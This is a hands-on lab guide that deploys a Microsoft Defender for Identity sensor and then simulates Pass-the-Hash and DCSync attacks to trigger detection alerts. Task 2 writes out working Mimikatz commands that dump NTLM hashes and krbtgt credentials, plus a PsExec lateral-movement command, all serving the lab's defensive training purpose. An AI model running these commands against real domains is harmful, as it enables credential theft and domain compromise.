# Hands on Labs - Day 3 
## Estimated Duration: 90 Minutes
### Exercise: 1

### Task 1: Deploy Microsoft Defender for Identity Sensor on Domain Controllers

In this task you will install and configure the Defender for Identity sensor on a domain controller to monitor identity-based threats.

1. Sign in to the Microsoft Defender Portal, open a browser and navigate to `security.microsoft.com`.

   - If you see the **Sign in to Microsoft Azure** tab, you will see the login screen. Enter the following email/username, and click on **Next**.

   * **Email/Username:** <inject key="AzureAdUserEmail"></inject>
     
   - Now enter the following password and click on **Sign in**.
   
   * **Password:** <inject key="AzureAdUserPassword"></inject>

1. On the Microsoft Defender page, select **Settings** and select **Identities** and you will be navigated to **Microsoft Defender for Identity** page.

      ![](../media/E1T1S2.png)

1. To create a Sensor, in the **Identities** section, click **Sensors** at the top, then select **Add sensor** in the top-right corner.

      ![](../media/E1T1S3.png)

1. On the **Simplify your installation process** pop-up, click **Continue with classic sensor**.

      ![](../media/E1T1S4.png)

1. A pop-up will display a **Download installer** button and an **Access key**. Click **Download installer** to download `Azure ATP Sensor Setup.zip`.

      ![](../media/E1T1S5.png)

1. Copy the **Access key** to your clipboard which will be used during the installation.

      ![](../media/E1T1S6.png)

1. Navigate to **Powershell (Admin)** and then run the below command to verify the connectivity and make sure to replace the `<your-workspace-name>` with your Defender for Identity workspace name

      ```shell
      https://<your-workspace-name>sensorapi.atp.azure.com
      ```

1. From your VM, navigate to the downloaded `Azure ATP Sensor Setup.zip` file in the Downloads folder, extract it to `C:\ATP`, and run `Azure ATP Sensor Setup.exe` as administrator.

1. On the Setup wizard follow the below steps:
     - Accept the license terms and click **Next**.
     - Enter the **Access key** copied earlier and click **Next**.
     - Choose the default installation path (e.g., `C:\Program Files\Azure Advanced Threat Protection Sensor`) and click **Install**.
   - Wait for the installation to complete.

1. Return to the Microsoft Defender portal, go to **Settings** > **Identities** > **Sensors**, find the sensor for `DC01.yourdomain.com`, and verify that the **Status** shows **running** within 5–10 minutes.

### Task 2: Simulate and Detect Lateral Movement Attacks (Read-Only)

In this task you will simulate Pass-the-Hash and DC Sync attacks and detect them using Defender for Identity.

#### **Simulate Pass-the-Hash Attack**:

1. Open a command prompt as administrator on `TestPC1`, navigate to the Mimikatz folder (e.g., `cd C:\Tools\Mimikatz`), and run Mimikatz to extract NTLM hashes.

     ```powershell
     mimikatz.exe "sekurlsa::logonpasswords" exit
     ```
1. Note the NTLM hash for the user.

1. Use the extracted hash to access a domain resource we are using PsExec to initiate a remote session with the domain controller. Run the following command to access the Domain Controller:


     ```powershell
     psexec.exe \\DC01.yourdomain.com -u yourdomain\testuser1 -p <NTLM-hash> cmd
     ```
     > **Note:** Replace `DC01.yourdomain.com` with your Domain and`<NTLM-hash>` with the hash obtained from the previous step.
       
#### **Simulate DC Sync Attack**:

1. In the same PowerShell session, run the below command to simulate a DC Sync attack and extract the credentials of the krbtgt account.

     ```powershell
     mimikatz.exe "lsadump::dcsync /domain:yourdomain.com /user:krbtgt" exit
     ```

1. Now you can check your alerts in the Microsoft Defender portal, navigate to **Incidents & alerts** in the left-hand navigation pane.

1. Click **Alerts** to view the alerts queue.

1. You will find alerts with the below names
     - **Suspected Pass-the-Hash attack (NTLM)** for the Pass-the-Hash simulation.
     - **Suspected DCSync attack** for the DC Sync simulation.
